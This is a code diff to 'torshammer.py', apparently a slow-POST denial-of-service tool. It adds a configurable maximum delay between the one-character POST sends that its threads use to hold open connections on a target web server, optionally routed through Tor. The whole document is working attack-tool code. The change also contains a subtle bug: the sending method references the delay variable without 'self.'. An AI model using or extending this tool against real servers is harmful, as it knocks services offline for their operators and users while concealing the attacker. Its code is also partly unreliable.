@@ -50,7 +50,7 @@ useragents = [
 
 
 class httpPost(Thread):
-    def __init__(self, host, port, tor, sockshost, socksport):
+    def __init__(self, host, port, tor, sockshost, socksport, maxsecondsbeetweenpacket):
         Thread.__init__(self)
         self.host = host
         self.port = port
@@ -58,6 +58,7 @@ class httpPost(Thread):
         self.tor = tor
         self.sockshost = sockshost
         self.socksport = socksport
+        self.maxsecondsbeetweenpacket = maxsecondsbeetweenpacket
         self.running = True
 
     def _send_http_post(self, pause=10):
@@ -79,7 +80,7 @@ class httpPost(Thread):
             p = random.choice(string.ascii_letters+string.digits)
             print(term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL)
             self.socks.send(p)
-            time.sleep(random.uniform(0.1, 3))
+            time.sleep(random.uniform(0.1, maxsecondsbeetweenpacket))
 
         # self.socks.close()
 
@@ -124,13 +125,14 @@ def usage():
     print(" -T|--tor Enable anonymising through tor on 127.0.0.1:9050")
     print(" -S|--sockshost <SOCKS host addrees> eg: 127.0.0.1")
     print(" -P|--socksport <SOCSS host port> Defaults to 1080")
+    print(" -i|--max-delay <max seconds beetwen packets in float> Defaults to 3.0")
     print(" -h|--help Shows this help\n")
     print("Eg. ./torshammer.py -t 192.168.1.100 -r 256\n")
 
 
 def main(argv):
     try:
-        opts, args = getopt.getopt(argv, "hTt:r:p:S:P:", ["help", "tor", "target=", "threads=", "port=", "sockshost=", "socksport="])
+        opts, args = getopt.getopt(argv, "hTt:r:p:S:P:i:", ["help", "tor", "target=", "threads=", "port=", "sockshost=", "socksport=", "max-delay="])
     except getopt.GetoptError:
         usage()
         sys.exit(-1)
@@ -143,6 +145,7 @@ def main(argv):
     port = 80
     sockshost = False
     socksport = 1080
+    maxsecondsbeetweenpacket = 3
 
     for o, a in opts:
         if o in ("-h", "--help"):
@@ -160,6 +163,8 @@ def main(argv):
             sockshost = a
         elif o in ("-P", "--socksport"):
             socksport = int(a)
+        elif o in ("-i", "--max-delay"):
+            maxsecondsbeetweenpacket = float(a)
 
     if target == '' or int(threads) <= 0:
         usage()
@@ -185,7 +190,7 @@ def main(argv):
 
     rthreads = []
     for i in range(threads):
-        t = httpPost(target, port, tor, sockshost, socksport)
+        t = httpPost(target, port, tor, sockshost, socksport, maxsecondsbeetweenpacket)
         rthreads.append(t)
         t.start()
 
